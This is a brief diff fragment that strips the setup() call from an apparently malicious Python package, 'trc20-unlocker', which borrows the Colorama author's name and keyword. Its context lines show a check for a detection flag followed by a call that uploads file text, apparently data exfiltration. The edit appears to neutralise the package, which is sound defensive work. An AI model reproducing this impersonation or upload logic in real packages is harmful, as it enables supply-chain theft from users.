@@ -681,16 +681,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-setup(
-
-    name='trc20-unlocker',
-    packages=['trc20-unlocker'],
-    version='1.0',
-    license='MIT',
-    description='Enables trc20 in exo',
-    author=' Jonathan Hartley',
-    keywords=['Colorama'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                      
